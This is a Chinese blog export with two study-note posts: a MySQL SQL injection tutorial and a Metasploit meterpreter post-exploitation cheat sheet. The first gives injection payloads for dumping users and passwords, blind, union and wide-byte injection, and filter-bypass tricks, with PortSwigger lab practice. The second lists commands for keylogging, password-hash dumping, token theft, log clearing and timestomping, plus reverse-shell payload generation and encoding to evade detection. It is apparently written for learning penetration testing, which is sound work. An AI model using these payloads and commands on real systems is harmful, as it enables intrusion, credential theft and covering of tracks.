<p>其中，判断后台数据库类型</p>
<h4 id="1-根据web语言判断："><a href="#1-根据web语言判断：" class="headerlink" title="1.根据web语言判断："></a>1.根据web语言判断：</h4><table>
<thead>
<tr>
<th>数据库类型</th>
<th>语言</th>
</tr>
</thead>
<tbody><tr>
<td>Mysql、PostgreSQL</td>
<td>PHP</td>
</tr>
<tr>
<td>Oracle、Mysql</td>
<td>Java</td>
</tr>
<tr>
<td>Oracle</td>
<td>JSP</td>
</tr>
<tr>
<td>MSSQL(Microsoft SQL Server)</td>
<td>ASP和.NET</td>
</tr>
</tbody></table>
<h4 id="2-根据操作系统："><a href="#2-根据操作系统：" class="headerlink" title="2.根据操作系统："></a>2.根据操作系统：</h4><p>Mysql：Apache</p>
<p>SQL server：windows(IIS)</p>
<h4 id="3-根据数据库报错判断："><a href="#3-根据数据库报错判断：" class="headerlink" title="3.根据数据库报错判断："></a>3.根据数据库报错判断：</h4><p>ａ．MYSQL数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>有mysql关键字，为MYSQL数据库。</p>
<p>ｂ．MSSQL数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft OLE DB Provider for ODBC Drivers 错误 &#39;80040e14&#39;  [Microsoft][ODBC SQL Server Driver][SQL Server]Line 1:</span><br></pre></td></tr></table></figure>

<p>mssql是微软的，由Microsoft和ODBC，为MSSQL数据库</p>
<p>ｃ．access数据库</p>
<p>Microsoft JET Database Engine错误’80040e14’错误的话，则是access数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注：</span><br><span class="line">详见：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;e308d96e2ecd</span><br></pre></td></tr></table></figure>

<p>ｄ．ORACLE数据库</p>
<p>ORA是ORACLE</p>
<p>以下都以Mysql为例</p>
<h3 id="b-常见函数："><a href="#b-常见函数：" class="headerlink" title="b.  常见函数："></a>b.  常见函数：</h3><ol>
<li><p>```</p>
<ol>
<li><p>version() MySQL 版本 select version()</p>
</li>
<li><p>user() 数据库用户名</p>
</li>
<li><p>database() 数据库名 select databases;</p>
</li>
<li><p>@@datadir 返回数据库的存储目录 select @@datadir;</p>
</li>
<li><p>@@version_compile_os 操作系统版本 select @@version_compile_os;</p>
</li>
<li><p>SQL 注释语句 (“–”与”/<em>…</em>/“)</p>
<p>(1)#<br>(2)–       表示单行注释<br>(3) /<em>comment</em>/    用于多行(块)注释<br>(4)/*! MYSQL Special SQL */</p>
</li>
<li><p>concat(str1,str2,…) 没有分隔符地连接字符串，如有任何一个参数为NULL ，则返回值为 NULL</p>
</li>
<li><p>concat_ws(separator,str1,str2,…) 含有分隔符地连接字符串</p>
</li>
<li><p>group_concat(str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每条数据</p>
</li>
<li><p>mid(str, pos, len);<br>substr();<br>substring()-从一个字符串中截取指定数量的字符</p>
</li>
<li><p>limit()  从某个值开始，取出之后的N条数据的语法 (返回结果中的前几条数据或者中间的数据)<br>select * from 表名 limit M,N;m是:指从m位开始(第一位为0)         n是:指取n条</p>
</li>
<li><p>order by 默认按照升序对记录进行排序， ORDER BY Company (DESC)</p>
</li>
<li><p>group by 结合合计函数，根据一个或多个列对结果集进行分组</p>
</li>
<li><p>sleep()<br>select sleep(N)可以让此语句运行N秒钟</p>
</li>
<li><p>if() 语法：<br>IF(expr1,expr2,expr3) 其中，expr1是判断条件，expr2和expr3是符合expr1的自定义的返回结果。</p>
</li>
<li><p>left() LEFT(str,len) 返回最左边的n个字符的字符串str，或NULL如果任何参数是NULL</p>
</li>
<li><p>count() COUNT(column_name) 语法 COUNT(column_name) 函数返回指定列的值的数目(NULL 不计入)</p>
</li>
<li><p>round()  四舍五入一个正数或者负数，结果为一定长度的值</p>
</li>
<li><p>hex() 16进制编码 select hex(‘dvwa’)  //编码         select unhex(‘64767761’)  //解码         </p>
<p>select 0x64767761  //16进制解码</p>
</li>
<li><p>ascii(arg) ：返回目标字符对应的ASCII码。   ord（arg）将字符转为ASCII     </p>
</li>
<li><p>char(arg)：返回ASCII码只对应的字符     语句：select char（97）</p>
</li>
<li><p>hex()：将目标字符串装换成16进制格式的数据     语句： select hex(“dvwa”)</p>
</li>
<li><p>unhex()：将16进制格式的数据装换成原字符串</p>
<pre><code>语句：unhex(64767761) 
</code></pre>
</li>
<li><p>load_file()读取文件</p>
</li>
<li><p>floor()返回小于等于X的最大整数</p>
</li>
<li><p>strcmp() 比较两个字符串ascii值的大小（大小写不敏感）</p>
</li>
<li><p>exp()返回e的X次方</p>
</li>
<li><p>Mysql可以使用的空白字符：<br>%09<br>%0a<br>%0b<br>%0c<br>%0d<br>%20<br>%a0<br>/**/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### c. 常用语句：</span><br><span class="line"></span><br><span class="line">- 查库</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">select schema_name from imformation_schema.schemata;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>查表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_table <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> schema_name<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>查字段</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> colunm_name <span class="keyword">from</span> information_schema.colunms <span class="keyword">where</span> table_name<span class="operator">=</span>users <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>查数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users;</span><br></pre></td></tr></table></figure>

<h3 id="d-常用名词："><a href="#d-常用名词：" class="headerlink" title="d. 常用名词："></a>d. 常用名词：</h3><p><strong>information_schema</strong></p>
<p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p>
<p><strong>SCHEMATA</strong></p>
<p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p>
<p><strong>TABLES</strong></p>
<p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p>
<p><strong>COLUMNS</strong></p>
<p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p>
</li>
</ol>
<h2 id="4-基本流程："><a href="#4-基本流程：" class="headerlink" title="4. 基本流程："></a>4. 基本流程：</h2><ol>
<li><p>判断是否有注入点</p>
</li>
<li><p>获取数据库基本信息</p>
<p>字段数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n </span><br></pre></td></tr></table></figure></li>
<li><p>获取数据库库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--获取系统数据库名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,schema_name <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="comment">--获取当前数据库名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,database()</span><br></pre></td></tr></table></figure></li>
<li><p>获取数据库表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="comment">--或者</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><p>获取数据库列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>获取用户信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,group_concat(username,password) <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure></li>
<li><p>破解数据</p>
</li>
<li><p>提升权限</p>
</li>
<li><p>内网渗透</p>
</li>
</ol>
<h2 id="5-注入分类"><a href="#5-注入分类" class="headerlink" title="5. 注入分类"></a>5. 注入分类</h2><h3 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h3><ul>
<li>数字型注入:注入的参数为整数</li>
<li>字符型注入：注入的参数为字符/串</li>
<li>搜索注入：在搜索栏中利用恶意代码进行注入</li>
</ul>
<h3 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a>按HTTP提交方式分</h3><ul>
<li><p>GET注入</p>
</li>
<li><p>POST注入：注入字段在POST数据中</p>
</li>
<li><p>Cookie注入：注入字段在Cookie数据中</p>
</li>
<li><p>XFF注入：XFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址</p>
</li>
</ul>
<h3 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h3><ul>
<li><p>报错注入</p>
</li>
<li><p>盲注</p>
<ul>
<li><p>布尔盲注</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; substr(database(),1,1)=&#x27;</span>t<span class="string">&#x27;--+     /*判断数据名长度*/</span></span><br></pre></td></tr></table></figure></li>
<li><p>时间盲注</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">&gt;</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>union注入 </p>
<p>列数相同且类型才能正常展示</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id <span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">/*获取字段*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><ul>
<li><p>宽字节注入</p>
<ol>
<li>宽字节是相对于ascII这样单字节而言；GB2312、GBK、GB18030、BIG5、Shift_JIS等都是宽字节，实际占两字节</li>
<li>一个gbk编码汉字，占2个字节。一个utf-8编码汉字，占3个字节</li>
<li>数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入</li>
</ol>
<p><strong>转义函数：</strong></p>
<p>为过滤用户输入，对特殊的字符加反斜杠“\”进行转义；</p>
<p>Mysql转义函数：addslashes，mysql_real_escape_string，mysql_escape_string等</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()过滤</li>
</ul>
<ul>
<li>数据库的编码为GBK</li>
<li>前一个ASCII码要大于128，才可以到达汉字的编码范围</li>
</ul>
<p><strong>利用方式:</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">-1</span><span class="operator">%</span>DF<span class="string">&#x27; union select 1,user(),3,%23</span></span><br></pre></td></tr></table></figure>

<p>在上述条件下，单引号’被转义为%5c，所以就构成了**%df**%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;&gt;(addslashes)&#x3D;&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;&#x3D;&gt;(GBK)&#x3D;&#x3D;&#x3D;&#x3D;&gt;運’</span><br><span class="line">用户输入&#x3D;&#x3D;&gt;过滤函数&#x3D;&#x3D;&gt;代码层的$sql&#x3D;&#x3D;&gt;mysql处理请求&#x3D;&#x3D;&gt;mysql中的sql</span><br></pre></td></tr></table></figure>

<p><strong>防御：</strong></p>
<p>使用mysql_set_charset指定字符集且使用mysql_real_escape_string进行转义</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> character_set_connection<span class="operator">=</span>gbk, character_set_results<span class="operator">=</span>gbk,character_set_client<span class="operator">=</span><span class="type">binary</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集（使用mysql_set_charset指定字符集），不会出现前面的df和<span class="number">5</span>c拼接为一个宽字节的问题</span><br></pre></td></tr></table></figure></li>
<li><p>base64注入：注入字符串经过base64加密</p>
<p>对参数进行base64编码，再发送请求。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*id=1&#x27;，1的base64编码为MSc=，而=的url编码为%3d*/</span></span><br><span class="line">id<span class="operator">=</span>MSc<span class="operator">%</span><span class="number">3</span>d </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="3-注入绕过"><a href="#3-注入绕过" class="headerlink" title="3.注入绕过"></a>3.注入绕过</h2><ul>
<li><p><strong>大小写绕过</strong>：大小写不敏感</p>
</li>
<li><p><strong>双写绕过</strong>：将关键字select等只使用replace()函数置换为空，select变成seleselectct</p>
</li>
<li><p><strong>编码绕过</strong>（url全编码、十六进制）：</p>
<ul>
<li>十六进制绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users where username &#x3D; 0x7465737431;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ascii 编码绕过</p>
<p>Test 等价于 CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
</li>
</ul>
</li>
<li><p><strong>内联注释绕过</strong> /* */</p>
</li>
<li><p><strong>关键字替换</strong></p>
<ul>
<li><p><strong>逗号绕过</strong></p>
<p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p>
<p>limit中可以利用offset来摆脱对逗号的利用</p>
</li>
<li><p><strong>比较符号( &gt;、&lt; )绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="operator">!</span>(id <span class="operator">&lt;&gt;</span> <span class="number">1</span>);</span><br><span class="line"><span class="comment">--等价于</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>逻辑符号的替换</strong>（and=&amp;&amp; or=|| xor=| not=!）</p>
</li>
<li><p><strong>空格绕过</strong>（用()，+等绕过）</p>
</li>
</ul>
</li>
<li><p><strong>等价函数绕过</strong></p>
<ul>
<li>hex()、bin()=ascii()</li>
<li>concat_ws()=group_concat()</li>
<li>mid()、substr()=substring()</li>
<li>sleep() –&gt;benchmark()</li>
</ul>
</li>
<li><p><strong>缓冲区溢出绕过</strong> (id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+ 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)</p>
</li>
</ul>
<p>到这儿大概可以拿下数据库的基本用户权限，若需提权需参考mysql MOF和UDF提权。</p>
<h2 id="4-练习："><a href="#4-练习：" class="headerlink" title="4. 练习："></a>4. 练习：</h2><p>以下为自己练习内容(可忽略)</p>
<h3 id="1-Retrieving-hidden-data"><a href="#1-Retrieving-hidden-data" class="headerlink" title="1.Retrieving hidden data"></a>1.Retrieving hidden data</h3><p><a href="https://ac991fcc1e603304800c031d001b00e5.web-security-academy.net/filter?category=Gifts">where子句的SQLi允许查询隐藏数据</a></p>
<ul>
<li>测试是否存在注入：’   ‘’，内部服务器错误，存在sql注入。</li>
</ul>
<p><img src="/2021/04/13/2021-04-13/2.jpg"></p>
<ul>
<li>数据库正常查询语句：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;pets&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<ul>
<li>加单/双引号测试注入:内部服务器报错</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39;&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<ul>
<li>加双连接符注释掉后面内容：无category为空的内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39;--&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<ul>
<li>加入真命题，返回全部内容，包含发布与未发布的。release=1代表已发布的。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39; or 1&#x3D;1 --&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<h3 id="2-Subverting-application-logic"><a href="#2-Subverting-application-logic" class="headerlink" title="2.Subverting application logic"></a>2.Subverting application logic</h3><p><a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">登陆绕过</a></p>
<p><img src="/2021/04/13/2021-04-13/5.jpg"></p>
<p>与上面相同，这里不再过多赘述</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">正常查询语句：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;administrator&#39; AND password &#x3D; &#39;admin&#39;</span><br><span class="line">测试：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;&#39;&#39; AND password &#x3D; &#39;admin&#39;</span><br><span class="line">注释后成功注入：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;administrator&#39;-- AND password &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>



<h3 id="3-UNION-attacks-where-you-can-retrieve-data-from-different-database-tables"><a href="#3-UNION-attacks-where-you-can-retrieve-data-from-different-database-tables" class="headerlink" title="3.UNION attacks, where you can retrieve data from different database tables."></a>3.UNION attacks, where you can retrieve data from different database tables.</h3><p>从数据库表中检索数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">正常查询：</span><br><span class="line">SELECT name,description FROM products WHERE category &#x3D; &#39;GIFTS&#39;</span><br><span class="line">查询其他数据：</span><br><span class="line">SELECT name,description FROM products WHERE category &#x3D; &#39;&#39;UNION SELECT username, password FROM users--</span><br></pre></td></tr></table></figure>

<p>union对原始查询结果追加多个额外的<code>SELECT</code>查询。必须满足：</p>
<ul>
<li>各个查询列数量相同。</li>
<li>每个列中的数据类型相同。</li>
</ul>
<p>要进行union注入的前提是，知道原始查询返回的列数、原始查询中返回的哪些列的数据类型比较适合保存注入的结果。</p>
<p>首先需要确定列数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; ORDER BY 1--</span><br><span class="line">&#39; ORDER BY 2--</span><br><span class="line">&#39; ORDER BY 3--</span><br><span class="line">etc.</span><br><span class="line">&#x2F;&#x2F;NULL可以转换为每种常用的数据类型</span><br><span class="line">&#39; UNION SELECT NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL,NULL--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure>

<h1 id="0x03-参考："><a href="#0x03-参考：" class="headerlink" title="0x03 参考："></a>0x03 参考：</h1><p><a href="https://www.loongten.com/2019/12/28/pentest-learn-sql-bypass/">https://www.loongten.com/2019/12/28/pentest-learn-sql-bypass/</a></p>
<p><a href="https://xz.aliyun.com/t/2869">https://xz.aliyun.com/t/2869</a></p>
<p><a href="https://tingqiao.github.io/posts/5a68b32e/">https://tingqiao.github.io/posts/5a68b32e/</a></p>
<p><a href="https://www.jianshu.com/p/5de47d05e333">https://www.jianshu.com/p/5de47d05e333</a></p>
]]></content>
      <tags>
        <tag>web安全</tag>
        <tag>网络安全</tag>
        <tag>SQL注入</tag>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>后渗透-metasploit(MSF) meterpreter</title>
    <url>/2021/04/01/msf/</url>
    <content><![CDATA[<p>msf深入起来包罗万象，那我们先慢慢来认识它吧。跟着某师傅的教程熟悉一遍，并记录自己所认为最重要的东西。</p>
<h1 id="0x01-MSF基础认知"><a href="#0x01-MSF基础认知" class="headerlink" title="0x01 MSF基础认知"></a>0x01 MSF基础认知</h1><h2 id="1-体系框架"><a href="#1-体系框架" class="headerlink" title="1.体系框架"></a>1.体系框架</h2><p><img src="/2021/04/01/msf/2.png"></p>
<h2 id="2-文件系统"><a href="#2-文件系统" class="headerlink" title="2.文件系统"></a>2.文件系统</h2><p>首先要知道msf的目录位于 <strong>/usr/share/metasploit-framework</strong></p>
<p>先熟悉一下msf的重要文件系统：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data：			Metasploit使用的可编辑文件,常用是其wordlists中的字典文件</span><br><span class="line">modules：		实际的MSF模块</span><br><span class="line">plugins：		可以在运行时加载的插件</span><br><span class="line">scripts：		Meterpreter和其他脚本</span><br><span class="line">tools：			各种有用的命令行工具</span><br><span class="line">documentation：	为框架提供文档</span><br><span class="line">external：		源代码和第三方库</span><br><span class="line">lib：			框架代码库的&#39;肉&#39;</span><br><span class="line"></span><br><span class="line">modules包括:</span><br><span class="line">    auxiliary	#漏洞辅助模块一般是没有攻击载荷的漏洞攻击</span><br><span class="line">    encoders 	#编码器模块</span><br><span class="line">    evasion	  	#简单的反杀模块</span><br><span class="line">    exploits	#渗透攻击模块</span><br><span class="line">    nops		#空指令模块</span><br><span class="line">    payloads	#漏洞负载模块</span><br></pre></td></tr></table></figure>

<h1 id="0x02-初始化"><a href="#0x02-初始化" class="headerlink" title="0x02 初始化"></a>0x02 初始化</h1><p>Metasploit使用<strong>PostgreSQL</strong>作为数据库，所以先启动postgresql.<br>并初始化数据库<br>然后以root用户打开MSF<br><img src="/2021/04/01/msf/1.jpg"></p>
<h1 id="0x03-后渗透必备命令"><a href="#0x03-后渗透必备命令" class="headerlink" title="0x03 后渗透必备命令"></a>0x03 后渗透必备命令</h1><h2 id="1）基本系统命令"><a href="#1）基本系统命令" class="headerlink" title="1）基本系统命令"></a>1）基本系统命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sessions -l  #列出会话id值   </span><br><span class="line">sessions -i &lt;ID值&gt;	#进入会话   </span><br><span class="line">sessions -k  #杀死会话</span><br><span class="line"></span><br><span class="line">reboot       #重启&#x2F;</span><br><span class="line">shutdown     #重启&#x2F;关机</span><br><span class="line"></span><br><span class="line">ps 			 #查看当前活跃进程    </span><br><span class="line">kill &lt;PID值&gt;  #杀死进程</span><br><span class="line"></span><br><span class="line">background 	#将当前会话放置后台</span><br><span class="line">run  		#执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info 		#查看已有模块信息</span><br><span class="line">getuid 		#查看权限 </span><br><span class="line">getpid 		#获取当前进程的pid</span><br><span class="line">sysinfo 	#查看目标机系统信息</span><br><span class="line">idletime 	#查看目标机闲置时间</span><br><span class="line">shell 		#进入目标机cmd shell</span><br></pre></td></tr></table></figure>



<h1 id="0x04-常用命令"><a href="#0x04-常用命令" class="headerlink" title="0x04 常用命令"></a>0x04 常用命令</h1><h2 id="metasploit命令"><a href="#metasploit命令" class="headerlink" title="metasploit命令"></a>metasploit命令</h2><ul>
<li>help<br>打开meterpreter使用帮助。</li>
<li>run scriptname<br>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</li>
<li>sysinfo<br>列出受控主机的系统信息。</li>
<li>ls<br>列出目标主机的文件和文件夹信息。</li>
<li>use priv<br>加载特权提升扩展模块，来扩展metasploit库。</li>
<li>ps<br>显示所有运行的进程以及相关联的用户账户。</li>
<li>migrate PID<br>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。</li>
<li>use incognito<br>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）</li>
<li>list_tokens -u<br>列出目标主机用户的可用令牌。</li>
<li>list_tokens -g<br>列出目标主机用户组的可用令牌。</li>
<li>impersonate_token DOMAIN_NAME\USERNAME.<br>假冒目标主机上的可用令牌。</li>
<li>steal_token PID<br>盗窃给定进程的可用令牌并进行令牌假冒。</li>
<li>drop_token<br>停止假冒当前令牌。</li>
<li>getsystem<br>通过各种攻击向量来提升系统用户权限。</li>
<li>execute -f cmd.exe -i<br>执行cmd.exe命令并进行交互。</li>
<li>execute -f cmd.exe -i -t<br>以所有可用令牌来执行cmd命令并隐藏该进程。</li>
<li>rev2self<br>回到控制目标主机的初始用户账户下。</li>
<li>reg command<br>在目标主机注册表中进行交互，创建，删除，查询等操作。</li>
<li>setdesktop number<br>切换到另一个用户界面（该功能基于那些用户已登录）。</li>
<li>screenshot<br>对目标主机的屏幕进行截图。</li>
<li>upload file<br>向目标主机上传文件。</li>
<li>download file<br>从目标主机下载文件。</li>
<li>keyscan_start<br>针对远程目标主机开启键盘记录功能。</li>
<li>keyscan_dump<br>存储目标主机上捕获的键盘记录。</li>
<li>keyscan_stop<br>停止针对目标主机的键盘记录。</li>
<li>getprivs<br>尽可能多的获取目标主机上的特权。</li>
<li>uictl enable keyboard/mouse<br>接管目标主机的键盘和鼠标。</li>
<li>background<br>将你当前的metasploit shell转为后台执行。</li>
<li>hashdump<br>导出目标主机中的口令哈希值。</li>
<li>use sniffer<br>加载嗅探模式。</li>
<li>sniffer_interfaces<br>列出目标主机所有开放的网络端口。</li>
<li>sniffer_dump interfaceID pcapname<br>在目标主机上启动嗅探。</li>
<li>sniffer_start interfaceID packet-buffer<br>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</li>
<li>sniffer_stats interfaceID<br>获取正在实施嗅探网络接口的统计数据。</li>
<li>sniffer_stop interfaceID<br>停止嗅探。</li>
<li>add_user username password -h ip<br>在远程目标主机上添加一个用户。</li>
<li>clearev<br>清楚目标主机上的日志记录。</li>
<li>timestomp<br>修改文件属性，例如修改文件的创建时间（反取证调查）。</li>
<li>reboot<br>重启目标主机。</li>
</ul>
<h2 id="msfpayload命令"><a href="#msfpayload命令" class="headerlink" title="msfpayload命令"></a>msfpayload命令</h2><ul>
<li>msfpayload -h<br>msfpayload的帮助信息。</li>
<li>msfpayload windows/meterpreter/bind_tcp O<br>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c<br>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java<br>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。</li>
</ul>
<h2 id="msfencode命令"><a href="#msfencode命令" class="headerlink" title="msfencode命令"></a>msfencode命令</h2><ul>
<li>mefencode -h<br>列出msfencode的帮助命令。</li>
<li>msfencode -l<br>列出所有可用的编码器。</li>
<li>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)<br>显示编码缓冲区的格式。</li>
<li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe<br>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe<br>创建一个经过多种编码格式嵌套编码的攻击载荷。</li>
<li>msfencode -i payload.raw BufferRegister=ESI -e x86/al破解a_mixed -t c<br>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C格式输出。</li>
</ul>
